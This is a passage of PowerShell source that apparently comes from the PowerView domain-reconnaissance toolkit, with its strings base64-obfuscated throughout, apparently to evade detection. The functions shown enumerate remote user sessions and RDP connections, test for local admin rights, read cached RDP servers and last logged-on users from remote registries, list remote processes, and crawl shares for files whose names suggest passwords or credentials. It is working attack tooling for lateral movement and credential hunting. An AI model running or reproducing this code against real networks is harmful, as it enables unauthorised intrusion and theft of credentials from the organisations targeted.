                $Offset += $Increment

            }

            
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHVzZXIgZG9lcyBub3QgaGF2ZSBhY2Nlc3MgdG8gdGhlIHJlcXVlc3RlZCBpbmZvcm1hdGlvbi4=")))}
                (124)         {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHZhbHVlIHNwZWNpZmllZCBmb3IgdGhlIGxldmVsIHBhcmFtZXRlciBpcyBub3QgdmFsaWQu")))}
                (87)          {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHNwZWNpZmllZCBwYXJhbWV0ZXIgaXMgbm90IHZhbGlkLg==")))}
                (234)         {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9yZSBlbnRyaWVzIGFyZSBhdmFpbGFibGUuIFNwZWNpZnkgYSBsYXJnZSBlbm91Z2ggYnVmZmVyIHRvIHJlY2VpdmUgYWxsIGVudHJpZXMu")))}
                (8)           {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdWZmaWNpZW50IG1lbW9yeSBpcyBhdmFpbGFibGUu")))}
                (2312)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QSBzZXNzaW9uIGRvZXMgbm90IGV4aXN0IHdpdGggdGhlIGNvbXB1dGVyIG5hbWUu")))}
                (2351)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIGNvbXB1dGVyIG5hbWUgaXMgbm90IHZhbGlkLg==")))}
                (2221)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWUgbm90IGZvdW5kLg==")))}
                (53)          {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdG5hbWUgY291bGQgbm90IGJlIGZvdW5k")))}
            }
        }
    }
}


function Get-NetSession {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [String]
        $UserName = ''
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }
    }

    process {

        
        $ComputerName = Get-NameField -Object $ComputerName

        
        $QueryLevel = 10
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        
        $Result = $Netapi32::NetSessionEnum($ComputerName, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

        
        $Offset = $PtrInfo.ToInt64()

        Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LU5ldFNlc3Npb24gcmVzdWx0OiAkUmVzdWx0")))

        
        if (($Result -eq 0) -and ($Offset -gt 0)) {

            
            $Increment = $SESSION_INFO_10::GetSize()

            
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                
                
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SESSION_INFO_10

                
                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment

            }
            
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHVzZXIgZG9lcyBub3QgaGF2ZSBhY2Nlc3MgdG8gdGhlIHJlcXVlc3RlZCBpbmZvcm1hdGlvbi4=")))}
                (124)         {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHZhbHVlIHNwZWNpZmllZCBmb3IgdGhlIGxldmVsIHBhcmFtZXRlciBpcyBub3QgdmFsaWQu")))}
                (87)          {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHNwZWNpZmllZCBwYXJhbWV0ZXIgaXMgbm90IHZhbGlkLg==")))}
                (234)         {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9yZSBlbnRyaWVzIGFyZSBhdmFpbGFibGUuIFNwZWNpZnkgYSBsYXJnZSBlbm91Z2ggYnVmZmVyIHRvIHJlY2VpdmUgYWxsIGVudHJpZXMu")))}
                (8)           {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdWZmaWNpZW50IG1lbW9yeSBpcyBhdmFpbGFibGUu")))}
                (2312)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QSBzZXNzaW9uIGRvZXMgbm90IGV4aXN0IHdpdGggdGhlIGNvbXB1dGVyIG5hbWUu")))}
                (2351)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIGNvbXB1dGVyIG5hbWUgaXMgbm90IHZhbGlkLg==")))}
                (2221)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWUgbm90IGZvdW5kLg==")))}
                (53)          {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdG5hbWUgY291bGQgbm90IGJlIGZvdW5k")))}
            }
        }
    }
}


function Get-NetRDPSession {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0")))
    )
    
    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }
    }

    process {

        
        $ComputerName = Get-NameField -Object $ComputerName

        
        $Handle = $Wtsapi32::WTSOpenServerEx($ComputerName)

        
        if ($Handle -ne 0) {

            Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V1RTT3BlblNlcnZlckV4IGhhbmRsZTogJEhhbmRsZQ==")))

            
            $ppSessionInfo = [IntPtr]::Zero
            $pCount = 0
            
            
            $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)

            
            $Offset = $ppSessionInfo.ToInt64()

            Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V1RTRW51bWVyYXRlU2Vzc2lvbnNFeCByZXN1bHQ6ICRSZXN1bHQ=")))
            Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cENvdW50OiAkcENvdW50")))

            if (($Result -ne 0) -and ($Offset -gt 0)) {

                
                $Increment = $WTS_SESSION_INFO_1::GetSize()

                
                for ($i = 0; ($i -lt $pCount); $i++) {
     
                    
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                    $RDPSession = New-Object PSObject

                    if ($Info.pHostName) {
                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Info.pHostName
                    }
                    else {
                        
                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                    }

                    $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbk5hbWU="))) $Info.pSessionName

                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                        
                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($Info.pUserName))
                    }
                    else {
                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9XHsxfQ=="))) -f $($Info.pDomainName), $($Info.pUserName))
                    }

                    $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUQ="))) $Info.SessionID
                    $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhdGU="))) $Info.State

                    $ppBuffer = [IntPtr]::Zero
                    $pBytesReturned = 0

                    
                    
                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned)

                    $Offset2 = $ppBuffer.ToInt64()
                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                    $SourceIP = $Info2.Address       
                    if($SourceIP[2] -ne 0) {
                        $SourceIP = [String]$SourceIP[2]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[3]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[4]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[5]
                    }
                    else {
                        $SourceIP = $Null
                    }

                    $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlSVA="))) $SourceIP
                    $RDPSession

                    
                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                    $Offset += $Increment
                }
                
                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
            }
            
            $Null = $Wtsapi32::WTSCloseServer($Handle)
        }
        else {
            
            
            $Err = $Kernel32::GetLastError()
            Write-Verbuse ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdEVycm9yOiAkRXJy")))
        }
    }
}


function Invoke-CheckLocalAdminAccess {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0")))
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }
    }

    process {

        
        $ComputerName = Get-NameField -Object $ComputerName

        
        
        $Handle = $Advapi32::OpenSCManagerW(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkQ29tcHV0ZXJOYW1l"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZXNBY3RpdmU="))), 0xF003F)

        Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlLUNoZWNrTG9jYWxBZG1pbkFjY2VzcyBoYW5kbGU6ICRIYW5kbGU=")))

        
        if ($Handle -ne 0) {
            
            $Null = $Advapi32::CloseServiceHandle($Handle)
            $True
        }
        else {
            
            
            $Err = $Kernel32::GetLastError()
            Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlLUNoZWNrTG9jYWxBZG1pbkFjY2VzcyBMYXN0RXJyb3I6ICRFcnI=")))
            $False
        }
    }
}


function Get-LastLoggedOn {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
    )

    process {

        
        $ComputerName = Get-NameField -Object $ComputerName

        
        try {
            $Reg = [WMIClass]"\\$ComputerName\root\default:stdRegProv"
            $HKLM = 2147483650
            $Key = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXV0aGVudGljYXRpb25cTG9nb25VSQ==")))
            $Value = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2dlZE9uVXNlcg==")))
            $Reg.GetStringValue($HKLM, $Key, $Value).sValue
        }
        catch {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEVycm9yIG9wZW5pbmcgcmVtb3RlIHJlZ2lzdHJ5IG9uICRDb21wdXRlck5hbWUuIFJlbW90ZSByZWdpc3RyeSBsaWtlbHkgbm90IGVuYWJsZWQu")))
            $Null
        }
    }
}


function Get-CachedRDPConnection {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    begin {
        if ($RemoteUserName -and $RemotePassword) {
            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
        }

        
        $HKU = 2147483651
    }

    process {

        try {
            if($Credential) {
                $Reg = Get-Wmiobject -List ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg=="))) -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
            }
            else {
                $Reg = Get-Wmiobject -List ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg=="))) -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
            }
        }
        catch {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWNjZXNzaW5nICRDb21wdXRlck5hbWUsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdA==")))
        }

        if(!$Reg) {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWNjZXNzaW5nICRDb21wdXRlck5hbWUsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdA==")))
        }
        else {
            
            $UserSIDs = ($Reg.EnumKey($HKU, "")).sNames | ? { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) }

            foreach ($UserSID in $UserSIDs) {

                try {
                    $UserName = Convert-SidToName $UserSID

                    
                    $ConnectionKeys = $Reg.EnumValues($HKU,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdA==")))).sNames

                    foreach ($Connection in $ConnectionKeys) {
                        
                        if($Connection -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVJVLio=")))) {
                            $TargetServer = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdA=="))), $Connection).sValue
                            
                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VydmVy"))) $TargetServer
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50"))) $Null
                            $FoundConnection
                        }
                    }

                    
                    $ServerKeys = $Reg.EnumKey($HKU,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycw==")))).sNames

                    foreach ($Server in $ServerKeys) {

                        $UsernameHint = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVyc1wkU2VydmVy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50")))).sValue
                        
                        $FoundConnection = New-Object PSObject
                        $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                        $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                        $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
                        $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VydmVy"))) $Server
                        $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50"))) $UsernameHint
                        $FoundConnection   
                    }

                }
                catch {
                    Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I6IHswfQ=="))) -f $_)
                }
            }
        }
    }
}


function Get-NetProcess {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    process {
        
        if($ComputerName) {
            
            $ComputerName = Get-NameField -Object $ComputerName          
        }
        else {
            
            $ComputerName = [System.Net.Dns]::GetHostName()
        }

        $Credential = $Null

        if($RemoteUserName) {
            if($RemotePassword) {
                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)

                
                try {
                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {
                        $Owner = $_.getowner();
                        $Process = New-Object PSObject
                        $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                        $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) $_.ProcessName
                        $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc0lE"))) $_.ProcessID
                        $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Owner.Domain
                        $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))) $Owner.User
                        $Process
                    }
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEVycm9yIGVudW1lcmF0aW5nIHJlbW90ZSBwcm9jZXNzZXMsIGFjY2VzcyBsaWtlbHkgZGVuaWVkOiB7MH0="))) -f $_)
                }
            }
            else {
                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIFJlbW90ZVBhc3N3b3JkIG11c3QgYWxzbyBiZSBzdXBwbGllZCE=")))
            }
        }
        else {
            
            try {
                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) $_.ProcessName
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc0lE"))) $_.ProcessID
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Owner.Domain
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))) $Owner.User
                    $Process
                }
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEVycm9yIGVudW1lcmF0aW5nIHJlbW90ZSBwcm9jZXNzZXMsIGFjY2VzcyBsaWtlbHkgZGVuaWVkOiB7MH0="))) -f $_)
            }
        }
    }
}


function Find-InterestingFile {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Llw="))),

        [String[]]
        $Terms,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $UsePSDrive,

        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    begin {
        
        $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        if(!$Path.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
            $Path = $Path + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))
        }
        if($Credential -ne [System.Management.Automation.PSCredential]::Empty) { $UsePSDrive = $True }

        
        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $SearchTerms = $Terms
        }

        if(-not $SearchTerms[0].startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))) {
            
            for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
                $SearchTerms[$i] = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KnswfSo="))) -f $($SearchTerms[$i]))
            }
        }

        
        if ($OfficeDocs) {
            $SearchTerms = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5kb2M="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5kb2N4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki54bHM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki54bHN4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5wcHQ="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5wcHR4"))))
        }

        
        if($FreshEXEs) {
            
            $LastAccessTime = (get-date).AddDays(-7).ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TU0vZGQveXl5eQ=="))))
            $SearchTerms = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5leGU=")))
        }

        if($UsePSDrive) {
            
            $Parts = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
            $FolderPath = $Parts[0..($Parts.length-2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))
            $FilePath = $Parts[-1]
            $RandDrive = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="))).ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW91bnRpbmcgcGF0aCAkUGF0aCB1c2luZyBhIHRlbXAgUFNEcml2ZSBhdCAkUmFuZERyaXZl")))

            try {
                $Null = New-PSDrive -Name $RandDrive -Credential $Credential -PSProvider FileSystem -Root $FolderPath -ErrorAction Stop
            }
            catch {
                Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgbW91bnRpbmcgcGF0aCAkUGF0aCA6IHswfQ=="))) -f $_)
                return $Null
            }

            
            $Path = $RandDrive + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        }
    }

    process {

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFNlYXJjaCBwYXRoICRQYXRo")))

        function Invoke-CheckWrite {
            
            [CmdletBinding()]param([String]$Path)
            try {
                $Filetest = [IO.FILE]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }

        $SearchArgs =  @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) = $Path
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yY2U="))) = $(-not $ExcludeHidden)
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ=="))) = $SearchTerms
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ==")))
        }

        Get-ChildItem @SearchArgs | ForEach-Object {
            Write-Verbose $_
            
            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | ForEach-Object {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | ForEach-Object {
            
            if((-not $CheckWriteAccess) -or (Invoke-CheckWrite -Path $_.FullName)) {$_}
        } | Select-Object FullName,@{Name=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI=")));Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {
            
            if($OutFile) {Export-PowerViewCSV -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3ZpbmcgdGVtcCBQU0RyaXZlICRSYW5kRHJpdmU=")))
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}








function Invoke-ThreadedFunction {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,

        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    begin {

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBob3N0czogezB9"))) -f $($ComputerName.count))

        
        
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        
        
        if(!$NoImports) {

            
            $MyVars = Get-Variable -Scope 2

            
